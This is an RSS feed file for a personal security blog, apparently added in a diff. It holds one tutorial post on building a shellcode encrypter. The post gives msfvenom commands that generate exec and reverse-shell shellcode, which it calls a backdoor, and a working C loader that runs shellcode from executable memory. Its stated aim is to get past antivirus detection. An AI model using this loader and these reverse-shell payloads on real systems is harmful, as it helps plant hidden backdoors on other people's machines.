@@ -1,0 +1,116 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Zero++; - Blog</title>
+    <description>a cool blog for people who wannabe 1337 like me</description>
+    <link>http://localhost:4000</link>
+    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
+    <author>
+      <name>Zero++;</name>
+      <email>RickAstley@rick.nl</email>
+      <uri>calloczero.github.io</uri>
+    </author>
+    
+      <item>
+        <title>Writing a Custom Shellcoder Encrypter - First Post by Zero++;</title>
+        <description>&lt;p&gt;In this blogpost we will write an custom Shellcode Cryptor in go.&lt;/p&gt;
+
+&lt;h2 id=&quot;but-what-exactly-is-shellcode&quot;&gt;But what exactly is Shellcode?&lt;/h2&gt;
+&lt;p&gt;Shellcode is a combination of binary instruction that will be executed on cpu.
+Shellcode can be used for everything, to spawn a reverse shell, to execute a program, to obtain a file descriptor or whatever.
+We 1337-heckers use Shellcode because its independent, minimalistic, easy to hide and obfuscate and also perfect to inject into processes.
+Shellcode can be written by Hand which is very difficult and not recommended by me, i would recommend to extract Shellcode from Assembly or any compiled programs.&lt;/p&gt;
+
+&lt;h2 id=&quot;requirements-to-follow-this-blog&quot;&gt;Requirements to follow this Blog&lt;/h2&gt;
+&lt;p&gt;This tutorial is for Linux but the Shellcode encoding works same on any Operating System, only the process of execution is different.
+In this tutorial we will use Metasploit’s msfvenom to generate the Shellcode, C and mmap (a Linux systemcall) to make the Shellcode executable.
+Shellcode itself is not Executable, data has to be in a specific file format like ELF (used by Unix and Linux for binaries, shared libraries etc.) or the more famous one PE (Portable Executable the file format used by windows for .exe and .dll files) to be executable. Thats why we will use C to make our Shellcode executable inside our program. I highly recommend to use gcc (the gnu compiler collection) or clang to compile your C Code. The go toolchain is also required.&lt;/p&gt;
+
+&lt;h2 id=&quot;generating-our-first-shellcode&quot;&gt;Generating our first Shellcode&lt;/h2&gt;
+&lt;p&gt;In this blogpost we will use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp/blog/&lt;/code&gt; as workspace.
+We will generate Unencrypted Shellcode in C format (later we will use the raw format).
+The Shellcode we will generate with msfvenom will execute the “ls” program.
+The -b option is for avoiding bytes, in Shellcoding on &lt;strong&gt;x86&lt;/strong&gt; we always have to avoid 
+NULL-BYTES because it will make our Shellcode stop working (i will not go into depth here).
+With specifying &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-f c&lt;/code&gt; we use the C format, it will output a C-bytearray which is just a normal array and can easily just get copied and pasted.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# create and navigate to workspace &lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;su
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; /tmp/blog
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp/blog
+&lt;span class=&quot;c&quot;&gt;# generate and show Shellcode &lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; linux/x86/exec &lt;span class=&quot;nv&quot;&gt;CMD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ls&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&quot;&lt;/span&gt; c &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; raw.txt 
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;raw.txt
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h1 id=&quot;executing-the-shellcode-in-c&quot;&gt;Executing the Shellcode in C&lt;/h1&gt;
+&lt;p&gt;Now copy the output of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat raw.txt&lt;/code&gt; into the C code down below here and replace your output with the “bytes” array”, the has to be renamed to “bytes”.
+After its done it should look like this.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;    /* standard input/output */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;   /* used for memcpy */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;sys/mman.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt; /* header for mmap syscall and flags */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x03\x00\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00\x6c\x73\x00\x57\x53\x89\xe1\xcd\x80&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;cm&quot;&gt;/* allocate a memory map */&lt;/span&gt;
+	&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;region&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mmap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
+
+			&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;PROT_WRITE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PROT_EXEC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;MAP_ANONYMOUS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MAP_PRIVATE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+			&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+			&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;cm&quot;&gt;/* check for error */&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;region&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MAP_FAILED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;perror&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;mmap&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+	
+	&lt;span class=&quot;cm&quot;&gt;/* copy shellcode into allocated memory page*/&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;region&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+	
+	&lt;span class=&quot;cm&quot;&gt;/* debug message */&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;executing %d bytes shellcode using mmap system call&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+
+	&lt;span class=&quot;cm&quot;&gt;/* executing the shellcode via function pointer */&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)())&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;region&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)();&lt;/span&gt;
+	
+	&lt;span class=&quot;cm&quot;&gt;/* deallocate the memory */&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;munmap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;region&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;notes-and-compiling-the-program&quot;&gt;Notes and Compiling the Program&lt;/h2&gt;
+&lt;p&gt;This blog is not a C course you already should be familiar with the C language.
+I will compile the program with the following command
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gcc -m32 file.c -o runme &amp;amp;&amp;amp; ./runme&lt;/code&gt;
+The -m32 option stands basically for 32 bit make sure you have gcc-multilib installed to be able to use the 32-bit headers. After Compiling and 
+executing the program we should get following output:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;executing 39 bytes shellcode using mmap system call
+file.c	raw.txt  runme
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;as we see the c code and the Shellcode execute “ls”, thats why it listed the files down below there.&lt;/p&gt;
+
+&lt;h2 id=&quot;generating-reverse-shell-shellcode-with-msfvenom&quot;&gt;Generating Reverse-Shell-Shellcode with msfvenom&lt;/h2&gt;
+&lt;p&gt;Now we will generate Shellcode which will spawn a Reverse-Shell.
+To run the Shellcode you have todo the same as before, just copy the output, paste, rename the array, compile and run.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p linux/x86/shell/reverse_tcp LHOST=127.0.0.1 LPORT=8089 -b &quot;\x00&quot; -f c -o raw.txt 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;For some reason msfvenom used shikata_ga_nai, but i didnt specify to use it which was really suprising for me. If we now upload the backdoor to VirusTotal it will be detected.
+&lt;img src=&quot;.images/vtotal01.png&quot; alt=&quot;Virus Total Screenshot here&quot; /&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Sun, 18 Sep 2022 00:00:00 +0200</pubDate>
+        <link>http://localhost:4000//Test-Post</link>
+        <link href="http://localhost:4000/Test-Post"/>
+        <guid isPermaLink="true">http://localhost:4000/Test-Post</guid>
+      </item>
+    
+  </channel>
+</rss>
